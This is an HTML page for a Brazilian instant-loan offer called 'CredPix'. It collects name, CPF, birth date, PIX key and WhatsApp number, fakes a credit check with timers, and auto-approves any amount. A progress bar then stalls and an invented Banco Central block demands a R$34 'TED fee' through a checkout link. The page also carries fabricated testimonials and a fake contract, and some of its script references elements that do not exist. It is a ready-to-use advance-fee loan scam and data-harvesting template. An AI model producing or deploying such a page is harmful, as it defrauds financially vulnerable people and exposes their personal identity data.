<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CredPix Mobile</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #f3f4f6; color: #111827; }
        .page { display: none; min-height: 100vh; flex-direction: column; }
        .page.active { display: flex; }
        .btn-gigante { background-color: #fbbf24; color: #000; font-weight: 900; font-size: 1.25rem; border-radius: 1rem; padding: 1.25rem; width: 100%; text-transform: uppercase; box-shadow: 0 4px 0 #d97706; }
        .btn-gigante:active { transform: translateY(2px); box-shadow: 0 2px 0 #d97706; }
        .glass-card { background: white; border-radius: 1.5rem; padding: 1.5rem; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); border: 1px solid #e5e7eb; }
        input, select { font-size: 16px !important; border: 2px solid #d1d5db !important; border-radius: 0.75rem !important; padding: 1rem !important; font-weight: 700 !important; color: #000 !important; }
        .footer-bloco { background-color: #1e3a8a; color: white; padding: 2rem 1rem; text-align: center; width: 100%; margin-top: auto; }
        .carousel-item { min-width: 100%; padding: 1rem; }
    </style>
</head>
<body>

    <section id="step1" class="page active">
        <header class="bg-blue-700 p-6 text-center shadow-lg">
            <h1 class="text-white font-black text-4xl italic tracking-tighter">CREDP<span class="text-yellow-400">IX</span></h1>
            <p class="text-yellow-300 font-bold text-sm mt-1 uppercase tracking-widest">A solução financeira em 2 minutos</p>
        </header>

        <main class="p-4">
            <div class="bg-blue-50 border-2 border-blue-200 rounded-2xl overflow-hidden mb-6 relative">
                <div class="flex transition-transform duration-500" id="carousel">
                    <div class="carousel-item text-center">
                        <p class="text-blue-800 font-black text-lg italic">1. SIMULE SEU CRÉDITO</p>
                        <p class="text-blue-600 text-sm font-bold">Escolha de R$ 2.000 a R$ 10.000</p>
                    </div>
                    <div class="carousel-item text-center">
                        <p class="text-blue-800 font-black text-lg italic">2. ANALISE GRATUITA</p>
                        <p class="text-blue-600 text-sm font-bold">Sem consulta ao Serasa ou SPC</p>
                    </div>
                    <div class="carousel-item text-center">
                        <p class="text-blue-800 font-black text-lg italic">3. RECEBA NA HORA</p>
                        <p class="text-blue-600 text-sm font-bold">Dinheiro via PIX em instantes</p>
                    </div>
                </div>
            </div>

            <div class="glass-card mb-6">
                <h2 class="text-2xl font-black text-center mb-6 leading-tight">PREENCHA PARA ANALISAR SEU LIMITE</h2>
                <div class="space-y-4">
                    <div>
                        <label class="block text-xs font-black text-gray-500 uppercase ml-1 mb-1">Nome Completo</label>
                        <input type="text" id="nome_in" placeholder="Ex: João Silva Santos" class="w-full">
                    </div>
                    <div>
                        <label class="block text-xs font-black text-gray-500 uppercase ml-1 mb-1">Seu CPF</label>
                        <input type="tel" id="cpf_in" placeholder="000.000.000-00" class="w-full">
                    </div>
                    <div>
                        <label class="block text-xs font-black text-gray-500 uppercase ml-1 mb-1">Data de Nascimento</label>
                        <input type="date" id="data_in" class="w-full">
                    </div>
                    <button onclick="nextStep(2)" class="btn-gigante mt-4">CONSULTAR LIMITE AGORA</button>
                </div>
            </div>

            <div class="space-y-3 mb-6">
                <p class="font-black text-gray-400 text-xs uppercase tracking-widest ml-1">Depoimentos</p>
                <div class="bg-white p-4 rounded-xl border-l-4 border-yellow-400 shadow-sm font-bold text-sm">"Caiu na hora que paguei a taxa de transferência. Muito bom!" - Maria S.</div>
                <div class="bg-white p-4 rounded-xl border-l-4 border-yellow-400 shadow-sm font-bold text-sm">"O único que aprovou com meu score baixo." - José R.</div>
                <div class="bg-white p-4 rounded-xl border-l-4 border-yellow-400 shadow-sm font-bold text-sm">"A carência de 180 dias me ajudou muito." - Regina N.</div>
                <div class="bg-white p-4 rounded-xl border-l-4 border-yellow-400 shadow-sm font-bold text-sm">"Prático e sem burocracia bancária." - Antônio F.</div>
                <div class="bg-white p-4 rounded-xl border-l-4 border-yellow-400 shadow-sm font-bold text-sm">"Recomendei pra família toda, aprovou geral." - Sueli A.</div>
            </div>
        </main>

        <footer class="footer-bloco">
            <p class="font-black text-lg mb-2">CREDPX BRASIL LTDA</p>
            <p class="text-xs opacity-80">Av. Brigadeiro Faria Lima, 3477 - São Paulo/SP</p>
            <p class="text-xs opacity-80 mt-1 font-bold">CNPJ: 44.650.594/0001-30</p>
        </footer>
    </section>

    <section id="step2" class="page bg-white items-center justify-center p-10 text-center">
        <div class="w-20 h-20 border-8 border-gray-100 border-t-blue-700 rounded-full animate-spin"></div>
        <h2 class="text-2xl font-black mt-8 italic uppercase">CONSULTANDO SCORE INTERNO...</h2>
        <p class="text-gray-500 font-bold mt-2">NÃO FECHE ESTA TELA</p>
    </section>

    <section id="step3" class="page p-4">
        <div class="glass-card mt-10 text-center">
            <h2 class="text-2xl font-black italic uppercase mb-8">LIMITE DISPONÍVEL</h2>
            <p class="text-6xl font-black text-blue-700 mb-8">R$ <span id="val-txt">2000</span></p>
            <input type="range" min="2000" max="10000" step="1" value="2000" oninput="updateVal(this.value)" class="w-full mb-10">
            <button onclick="approveProcess()" class="btn-gigante">CONFIRMAR VALOR</button>
        </div>
    </section>

    <section id="step4" class="page items-center justify-center p-6 text-center">
        <div class="bg-white p-10 rounded-3xl shadow-2xl border-4 border-green-500">
            <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
                <svg class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg>
            </div>
            <h2 class="text-3xl font-black italic uppercase mb-2">APROVADO!</h2>
            <p class="text-xl font-bold text-gray-600 mb-10">R$ <span class="v-final">2000</span> LIBERADOS</p>
            <button onclick="nextStep(5)" class="btn-gigante">ESCOLHER PARCELAS</button>
        </div>
    </section>

    <section id="step5" class="page p-4">
        <h2 class="text-2xl font-black text-center mt-10 mb-8 italic uppercase text-blue-900">PLANO DE PAGAMENTO</h2>
        <div class="space-y-4">
            <button onclick="setPlan('36x', 58.33)" class="glass-card w-full text-left flex justify-between items-center border-2 border-gray-100 active:border-blue-500">
                <div>
                    <p class="text-3xl font-black">36x</p>
                    <p class="text-green-600 font-bold text-xs uppercase">180 dias de carência</p>
                </div>
                <p class="text-2xl font-black text-blue-700">R$ <span class="p36">58,33</span></p>
            </button>
            <button onclick="setPlan('48x', 44.12)" class="glass-card w-full text-left flex justify-between items-center border-2 border-gray-100 active:border-blue-500">
                <div>
                    <p class="text-3xl font-black">48x</p>
                    <p class="text-green-600 font-bold text-xs uppercase">180 dias de carência</p>
                </div>
                <p class="text-2xl font-black text-blue-700">R$ <span class="p48">44,12</span></p>
            </button>
            <button onclick="setPlan('64x', 33.08)" class="glass-card w-full text-left flex justify-between items-center border-2 border-gray-100 active:border-blue-500">
                <div>
                    <p class="text-3xl font-black">64x</p>
                    <p class="text-green-600 font-bold text-xs uppercase">180 dias de carência</p>
                </div>
                <p class="text-2xl font-black text-blue-700">R$ <span class="p64">33,08</span></p>
            </button>
        </div>
    </section>

    <section id="step6" class="page p-4">
        <div class="glass-card mt-10">
            <h2 class="text-xl font-black text-center mb-6 uppercase italic">DESTINO DO PIX</h2>
            <div class="space-y-4">
                <input type="text" id="px_k" placeholder="Sua Chave PIX" class="w-full">
                <select id="bn_u" class="w-full">
                    <option>Escolha seu Banco</option>
                    <option>Nubank</option><option>Inter</option><option>Caixa</option><option>Itaú</option><option>Bradesco</option><option>Santander</option><option>C6 Bank</option><option>Banco do Brasil</option><option>Neon</option><option>PagBank</option>
                </select>
                <input type="tel" id="wt_u" placeholder="WhatsApp com DDD" class="w-full">
                <button onclick="compile()" class="btn-gigante mt-4">REVISAR DADOS</button>
            </div>
        </div>
    </section>

    <section id="step7" class="page p-4">
        <div class="glass-card mt-10">
            <h2 class="text-xl font-black text-center mb-6 uppercase italic">CONFERIR DADOS</h2>
            <div class="bg-gray-100 p-6 rounded-2xl space-y-3 font-bold text-sm">
                <p class="flex justify-between border-b pb-2">NOME: <span id="r_nome" class="text-blue-700 text-right">---</span></p>
                <p class="flex justify-between border-b pb-2">CPF: <span id="r_cpf" class="text-blue-700">---</span></p>
                <p class="flex justify-between border-b pb-2">VALOR: <span id="r_val" class="text-blue-700">---</span></p>
                <p class="flex justify-between border-b pb-2">PLANO: <span id="r_pla" class="text-blue-700">---</span></p>
                <p class="flex justify-between">CHAVE: <span id="r_cha" class="text-blue-700 text-right">---</span></p>
            </div>
            <button onclick="nextStep(8)" class="btn-gigante mt-8">TUDO CERTO, RECEBER</button>
        </div>
    </section>

    <section id="step8" class="page p-4">
        <div class="glass-card mt-10">
            <h2 class="text-xl font-black text-center mb-4 italic uppercase tracking-tighter">CONTRATO DIGITAL</h2>
            <div class="h-48 overflow-y-scroll bg-gray-50 p-4 rounded-xl text-[10px] font-bold text-gray-500 leading-relaxed mb-6 border">
                <p class="mb-2">1. O CredPix realiza a intermediação de crédito direto para pessoas físicas.</p>
                <p class="mb-2">2. O cliente declara que as informações são reais para fins de contrato.</p>
                <p class="mb-2">3. A liberação do crédito é protegida por protocolos de segurança criptografados.</p>
                <p class="mb-2">4. Fica garantido o prazo de 180 dias para o início do pagamento das parcelas.</p>
                <p class="mb-2">5. O sistema opera 24h por dia para envios via PIX.</p>
                <p>6. Este documento tem validade jurídica de assinatura eletrônica.</p>
            </div>
            <button onclick="final()" class="btn-gigante">ASSINAR E RECEBER</button>
        </div>
    </section>

    <section id="step9" class="page p-6 items-center pt-20">
        <h2 class="text-2xl font-black italic uppercase mb-10">ENVIANDO SEU PIX...</h2>
        <div class="w-full bg-gray-200 h-10 rounded-full overflow-hidden border-2 border-white shadow-inner mb-4">
            <div id="bar" class="bg-blue-600 h-full w-0 transition-all duration-300"></div>
        </div>
        <p id="b-txt" class="font-black text-blue-800 uppercase tracking-tighter">PROCESSANDO (0%)</p>

        <div id="m-ted" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center p-6 z-50">
            <div class="bg-white rounded-3xl p-8 text-center max-w-sm border-4 border-red-500">
                <div class="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
                </div>
                <h3 class="font-black text-2xl mb-4 italic uppercase">ERRO NO ENVIO!</h3>
                <p class="text-gray-600 font-bold text-sm leading-tight mb-8">
                    O Banco Central bloqueou o envio de R$ <span class="v-final">2000</span> por falta da <span class="text-red-600 underline text-lg">TAXA DE TED</span> obrigatória para novos clientes. Pague R$ 34,00 agora para desbloquear o valor imediatamente.
                </p>
                <button onclick="window.location.href='https://checkout.exemplo.com/ted34'" class="btn-gigante">PAGAR TED E RECEBER AGORA</button>
            </div>
        </div>
    </section>

    <script>
        let val = 2000; let pla = ""; let cur = 0;
        setInterval(() => { cur = (cur+1)%3; document.getElementById('carousel').style.transform = `translateX(-${cur*100}%)`; }, 4000);
        
        function nextStep(s) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('step'+s).classList.add('active');
            window.scrollTo(0,0);
            if(s === 2) setTimeout(() => nextStep(3), 3000);
        }

        function updateVal(v) {
            val = v; document.getElementById('val-txt').innerText = v;
            document.querySelectorAll('.v-final').forEach(e => e.innerText = v);
            document.querySelector('.p36').innerText = (v/36 * 1.05).toFixed(2);
            document.querySelector('.p48').innerText = (v/48 * 1.05).toFixed(2);
            document.querySelector('.p64').innerText = (v/64 * 1.05).toFixed(2);
        }

        function approveProcess() {
            nextStep(4);
            setTimeout(() => {
                document.getElementById('approve-title').innerText = "R$ " + val + " LIBERADOS!";
                document.getElementById('check-icon').classList.remove('hidden');
                document.getElementById('approve-btn').classList.remove('hidden');
                document.getElementById('approve-desc').innerText = "VALOR DISPONÍVEL PARA SAQUE";
            }, 3000);
        }

        function setPlan(p, v) { pla = p; nextStep(6); }

        function compile() {
            document.getElementById('r_nome').innerText = document.getElementById('nome_in').value.toUpperCase();
            document.getElementById('r_cpf').innerText = document.getElementById('cpf_in').value;
            document.getElementById('r_val').innerText = "R$ " + val;
            document.getElementById('r_pla').innerText = pla;
            document.getElementById('r_cha').innerText = document.getElementById('px_k').value;
            nextStep(7);
        }

        function final() {
            nextStep(9); let w = 0;
            let int = setInterval(() => {
                if(w >= 99) { clearInterval(int); document.getElementById('m-ted').classList.remove('hidden'); }
                else { w++; document.getElementById('bar').style.width = w+'%'; document.getElementById('b-txt').innerText = "ENVIANDO ("+w+"%)"; }
            }, 60);
        }
    </script>
</body>
</html>
